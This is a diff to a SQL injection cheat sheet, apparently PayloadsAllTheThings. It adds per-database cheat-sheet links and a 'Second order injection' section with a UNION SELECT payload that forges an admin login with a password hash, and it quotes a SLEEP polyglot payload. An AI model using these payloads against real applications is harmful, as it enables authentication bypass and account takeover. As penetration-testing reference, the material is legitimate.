@@ -2,13 +2,19 @@
 A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application
 
 ## Summary
-* [Entry point detection](#)
-* [DBMS Identification](#)
-* [SQL injection using SQLmap](#)
-* [Authentication bypass](#)
-* [Polyglot injection](#)
-* [Insert Statement - ON DUPLICATE KEY UPDATE](#)
-* [WAF Bypass](#)
+* [CheatSheet MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MSSQL%20Injection.md)
+* [CheatSheet MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md)
+* [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/OracleSQL%20Injection.md)
+* [CheatSheet PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/PostgreSQL%20Injection.md)
+* [CheatSheet SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/SQLite%20Injection.md)
+* [Entry point detection](#entry-point-detection)
+* [DBMS Identification](#dbms-identification)
+* [SQL injection using SQLmap](#sql-injection-using-sqlmap)
+* [Authentication bypass](#authentication-bypass)
+* [Polyglot injection](#polyglot-injection-multicontext)
+* [Second order injection](#second-order-injection)
+* [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
+* [WAF Bypass](#waf-bypass)
 
 
 ## Entry point detection
@@ -275,6 +281,11 @@ admin") or "1"="1"/*
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
+## Second order injection
+```sql
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+```
+
 ## Insert Statement - ON DUPLICATE KEY UPDATE
 ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
 ```sql
@@ -392,7 +403,7 @@ mysql> mysql> select version();
   - [Reiners mySQL injection Filter Evasion Cheatsheet] (https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
   - [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
   - [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
-* MSQQL:
+* MSSQL:
   - [EvilSQL's Error/Union/Blind MSSQL Cheatsheet] (http://evilsql.com/main/page2.php)
   - [PentestMonkey's MSSQL SQLi injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 * ORACLE:
